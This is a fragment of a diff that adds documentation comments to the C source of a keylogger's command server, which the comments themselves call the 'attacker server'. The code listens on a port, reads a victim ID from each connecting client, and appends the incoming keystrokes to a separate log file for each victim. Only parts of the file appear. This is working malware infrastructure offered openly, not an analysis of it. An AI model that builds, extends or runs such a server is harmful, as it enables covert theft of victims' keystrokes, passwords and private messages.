@@ -8,6 +8,12 @@
 #include <sys/stat.h>
 #include <errno.h>
 
+/**
+ * @brief Creates the logs directory
+ * 
+ * Creates a directory named "logs" with read/write/execute permissions. 
+ * Ignores the error if the directory already exists
+ */
 void init_log_directory(void)
 {
     if (mkdir("logs", 0777) == -1)
@@ -19,6 +25,17 @@ void init_log_directory(void)
     }
 }
 
+/**
+ * @brief Reads and parses the unique victim ID from the client connection
+ * 
+ * Reads data byte by byte until a newline is found, expecting an "ID:<hash>" 
+ * format. Removes the "ID:" prefix to leave only the hash
+ * 
+ * @param sock         The socket file descriptor connected to the client
+ * @param id_buf       Buffer to store the parsed victim ID
+ * @param id_buf_size  The size of the provided buffer
+ * @return 0 on success, -1 if the format is invalid or the connection fails
+ */
 int read_victim_id(int sock, char *id_buf, size_t id_buf_size)
 {
     int idx = 0; // Index counter to track the current position in the buffer
@@ -54,12 +71,21 @@ int read_victim_id(int sock, char *id_buf, size_t id_buf_size)
     return -1;
 }
 
+/**
+ * @brief Thread routine to handle an individual client's data stream
+ * 
+ * Uses the victim ID to create a unique log file, then continuously receives
+ * and appends keystrokes to both the terminal and the specific log file
+ * 
+ * @param arg Pointer to a client_info_t struct containing socket and IP details
+ * @return NULL when the client disconnects or an error occurs.
+ */
 void *handle_client(void *arg)
 {
     client_info_t *client = (client_info_t *)arg;
-    char buffer[BUF_SIZE];
-    char filename[FILENAME_LEN];
-    char victim_id[VICTIM_ID_LEN];
+    char buffer[BUF_SIZE]; // stores the logs from recv
+    char filename[FILENAME_LEN]; // log file name
+    char victim_id[VICTIM_ID_LEN]; // the hash
     FILE *log_file;
 
     printf("(+) Client connected from %s:%d\n", client->client_ip, client->client_port);
@@ -75,7 +101,7 @@ void *handle_client(void *arg)
 
     printf("(+) Victim ID for %s:%d is %s\n", client->client_ip, client->client_port, victim_id);
 
-    // Log file name based on victim ID, not IP/port
+    // Log file name based on victim ID
     snprintf(filename, sizeof(filename), "logs/%s.log", victim_id);
 
     log_file = fopen(filename, "a");
@@ -112,11 +138,21 @@ void *handle_client(void *arg)
     pthread_exit(NULL);
 }
 
+/**
+ * @brief Main function of the attacker server
+ * 
+ * Initializes the logs directory, binds to the specified port, and listens for
+ * incoming connections. Spawns a new detached thread for every client that connects
+ * 
+ * @param argc Number of command line arguments
+ * @param argv Array of command line argument strings
+ * @return 0 on normal exit, 1 if socket creation or binding fails
+ */
 int main(int argc, char *argv[])
 {
     int server_fd;
     struct sockaddr_in server_addr;
-    int port = 8080; // Default port
+    int port = DEFAULT_PORT;
 
     for (int i = 1; i < argc; i++)
     {
@@ -168,6 +204,8 @@ int main(int argc, char *argv[])
             continue;
         }
 
+        // Prevent race condition between the main server thread overwriting client_data on 
+        // next loop iteration and for created thread to read that data before it changes
         client_info_t *client_data = malloc(sizeof(client_info_t));
         if (!client_data)
         {
